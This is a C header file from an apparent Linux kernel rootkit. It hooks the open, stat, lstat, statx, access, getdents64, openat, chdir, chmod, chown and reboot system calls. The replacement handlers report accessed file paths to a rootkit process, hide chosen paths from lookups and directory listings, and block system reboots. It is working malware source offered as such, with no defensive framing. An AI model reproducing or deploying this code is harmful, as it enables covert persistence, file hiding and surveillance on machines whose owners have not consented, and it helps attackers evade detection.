//
// Created by idan on 1/16/24.
//

#ifndef ROOTKIT_HOOKED_SYSCALLS_H
#define ROOTKIT_HOOKED_SYSCALLS_H

//#include <linux/kernel.h>
#include <asm/unistd.h>

#include "syscall_hooking_lib.h"

extern unsigned long rootkit_pid;

extern int new_open(const struct pt_regs *regs);
struct syscall_hook_handle open_hook = {__NR_open, 0, new_open};

extern asmlinkage int new_stat(const struct pt_regs *regs);
struct syscall_hook_handle stat_hook = {__NR_stat, 0, new_stat};

extern asmlinkage int new_lstat(const struct pt_regs *regs);
struct syscall_hook_handle lstat_hook = {__NR_lstat, 0, new_lstat};

asmlinkage int new_statx(const struct pt_regs *regs);
struct syscall_hook_handle statx_hook = {__NR_statx, 0, new_statx};

asmlinkage int new_access(const struct pt_regs *regs);
struct syscall_hook_handle access_hook = {__NR_access, 0, new_access};

asmlinkage int new_getdents64(const struct pt_regs *regs);
struct syscall_hook_handle getdents64_hook = {__NR_getdents64, 0, new_getdents64};

asmlinkage int new_openat(const struct pt_regs *regs);
struct syscall_hook_handle openat_hook = {__NR_openat, 0, new_openat};

asmlinkage int new_chdir(const struct pt_regs *regs);
struct syscall_hook_handle chdir_hook = {__NR_chdir, 0, new_chdir};

asmlinkage int new_chmod(const struct pt_regs *regs);
struct syscall_hook_handle chmod_hook = {__NR_chmod, 0, new_chmod};

asmlinkage int new_chown(const struct pt_regs *regs);
struct syscall_hook_handle chown_hook = {__NR_chown, 0, new_chown};

asmlinkage int new_reboot(const struct pt_regs *regs);
struct syscall_hook_handle reboot_hook = {__NR_reboot, 0, new_reboot};

//#include <linux/file.h>
#include <linux/fdtable.h>
//#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/path.h>
//#include <linux/dcache.h>
#include <linux/dirent.h>

#include "communicate.h"
#include "hidden_paths.h"
#include "chars_trie.h"

asmlinkage int new_open(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

//    my_send_msg(rootkit_pid, path); // send data (file path)

    return (*((int (*)(const struct pt_regs *)) open_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_stat(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (is_path_hidden(path)) {
        printk(KERN_INFO
        "hid the path from stat: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) stat_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_lstat(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (is_path_hidden(path)) {
        printk(KERN_INFO
        "hid the path from lstat: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) lstat_hook.orig_syscall_addr))(regs);
}

char statx_buff[PATH_MAX];
asmlinkage int new_statx(const struct pt_regs *regs) {
    char __user
    *file_p = (char *) regs->si;

    my_send_msg(rootkit_pid, file_p); // send data (file path)

    if (file_p[0] == '/') {
        if (is_path_hidden(file_p)) {
            printk(KERN_INFO
            "hid the path from statx: %s\n", file_p);
            return -1;
        }

    } else {
        int dirfd = regs->di;

        switch (dirfd) {
            case AT_FDCWD: {
                struct path pwd = current->fs->pwd;
//                path_get(&pwd);

                memset(statx_buff, '\x00', PATH_MAX);
                char *cwd = d_path(&pwd, statx_buff, PATH_MAX);
                printk(KERN_INFO
                "cwd: %s", cwd);

                const char* path_arr[] = {cwd, "/", file_p};
                if (is_path_arr_hidden(path_arr, 3)) { // found
                    printk(KERN_INFO
                    "hiding in statx: %s", file_p);
                    return -1;
                }
            }
        }
    }

    return (*((int (*)(const struct pt_regs *)) statx_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_access(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (is_path_hidden(path)) {
        printk(KERN_INFO
        "hid the path from access: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) access_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_getdents64(const struct pt_regs *regs) {
    int ret = (*((int (*)(const struct pt_regs *)) getdents64_hook.orig_syscall_addr))(regs);
    if (ret <= 0)
        return ret;

    int fd = regs->di;

    struct file *file = fget(fd); // get the struct file associated with the file descriptor
    if (file == NULL) {
        printk(KERN_ALERT
        "Failed to get file structure for fd: %u\n", fd);
        return ret;
    }

    struct path path = file->f_path;
//    path_get(&path); // increment the reference count

    fput(file); // release the reference to the struct file

    char buff[PATH_MAX];
    memset(buff, '\x00', PATH_MAX);
    char *dir_path = d_path(&path, buff, PATH_MAX);
    printk(KERN_INFO
    "Directory Path: %s\n", dir_path);

    struct node *s = search(get_hidden_paths_root_node(), dir_path);
    if (s == 0) { // directory is okay anyway, can return now
//        path_put(&path); // Release the reference to the path
        return ret;
    } else {
        s = search(s, "/");
        if (s == 0) { // directory is okay anyway, can return now
//            path_put(&path); // Release the reference to the path
            return ret;
        }
    }


    printk(KERN_INFO
    "checking directory");
    struct linux_dirent64 __user
    *dirent = (struct linux_dirent64 *) regs->si;

    // copying the whole buffer from userspace
    struct linux_dirent64 *buffer = (struct linux_dirent64 *) kmalloc(regs->dx,
                                                                      GFP_KERNEL); // todo problem probably because of too many allocations and deallocations?
    if (buffer == NULL) {
        return ret;
    }
    if (copy_from_user(buffer, dirent, ret)) {
        kfree(buffer);
        return ret;
    }

    unsigned long offset = 0;
    int curr_ret = ret; // final buffer size after modifications
    int sz_left = ret; // current size left until end of buffer
    while (offset < curr_ret) {
        struct linux_dirent64 *current_dir = (struct linux_dirent64 *) ((void *) buffer + offset);
        int curr_dir_sz = current_dir->d_reclen; // curr dir size

        struct node *e_s = search(s, current_dir->d_name);
        if (e_s == 0) goto proceed;

        if (isMarked(e_s)) { // hide this entry
            curr_ret -= curr_dir_sz; // decremnting this dir's size from final size
            sz_left -= curr_dir_sz;
            if (sz_left > 0)
                memmove(current_dir, (void *) current_dir + curr_dir_sz,
                        sz_left); // shifting down the rest of the directories, effectively "destroying" the current directory

            continue;
        }

        proceed:
        {
            offset += curr_dir_sz;
            sz_left -= curr_dir_sz;
        }
    }

//    path_put(&path); // Release the reference to the path

    // resetting the rest of the buffer
    memset((void *) buffer + curr_ret, '\x00', ret - curr_ret);

    // copying our local buffer that may have been edited back to userspace
    if (copy_to_user(dirent, buffer, curr_ret)) {
        kfree(buffer);
        return ret;
    }

    kfree((void *) buffer);

    return curr_ret;
}

asmlinkage int new_openat(const struct pt_regs *regs) {
    char __user
    *file_p = (char *) regs->si;

    my_send_msg(rootkit_pid, file_p); // send data (file path)

    if (file_p[0] == '/') {
        if (is_path_hidden(file_p)) {
            printk(KERN_INFO
            "hid the path from openat: %s\n", file_p);
            return -1;
        }

    } else {
        int dirfd = regs->di;

        switch (dirfd) {
            case AT_FDCWD: {
                struct path pwd = current->fs->pwd;
//                path_get(&pwd);

                memset(statx_buff, '\x00', PATH_MAX);
                char *cwd = d_path(&pwd, statx_buff, PATH_MAX);
                printk(KERN_INFO
                "cwd: %s", cwd);

//                path_put(&pwd);

                const char* path_arr[] = {cwd, "/", file_p};
                if (is_path_arr_hidden(path_arr, 3)) { // found
                    printk(KERN_INFO
                    "hiding in openat: %s", file_p);
                    return -1;
                }
            }
        }
    }

    return (*((int (*)(const struct pt_regs *)) openat_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_chdir(const struct pt_regs *regs){
    char __user
    *dir_path = (char *) regs->di;

    my_send_msg(rootkit_pid, dir_path);

    if (is_path_hidden(dir_path)) {
        printk(KERN_INFO
        "hid the path from chdir: %s\n", dir_path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) chdir_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_chmod(const struct pt_regs *regs){
    char __user
    *file_path = (char *) regs->di;

    my_send_msg(rootkit_pid, file_path);

    if (is_path_hidden(file_path)) {
        printk(KERN_INFO
        "hid the path from chmod: %s\n", file_path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) chmod_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_chown(const struct pt_regs *regs){
    char __user
    *file_path = (char *) regs->di;

    my_send_msg(rootkit_pid, file_path);

    if (is_path_hidden(file_path)) {
        printk(KERN_INFO
        "hid the path from chown: %s\n", file_path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) chown_hook.orig_syscall_addr))(regs);
}

asmlinkage int new_reboot(const struct pt_regs *regs) {
    // do nothing
    return -EPERM;

//    return (*((int (*)(const struct pt_regs *)) reboot_hook.orig_syscall_addr))(regs);
}

#endif //ROOTKIT_HOOKED_SYSCALLS_H
